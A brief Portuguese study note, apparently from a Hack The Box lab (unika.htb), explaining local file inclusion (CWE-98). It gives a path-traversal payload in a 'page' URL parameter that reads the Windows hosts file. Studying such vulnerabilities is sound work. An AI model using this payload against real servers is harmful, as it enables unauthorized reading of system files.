# CWE-98 File Inclusion
## (LFI) Local file Inclusion
Aceder aos ficheiros de um servidor a partir de um URL não sanetizado
**DE**
http://unika.htb/index.php?page=french.html
**PARA**
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
	Paylaod:../../../../../../../../../windows/system32/drivers/etc/hosts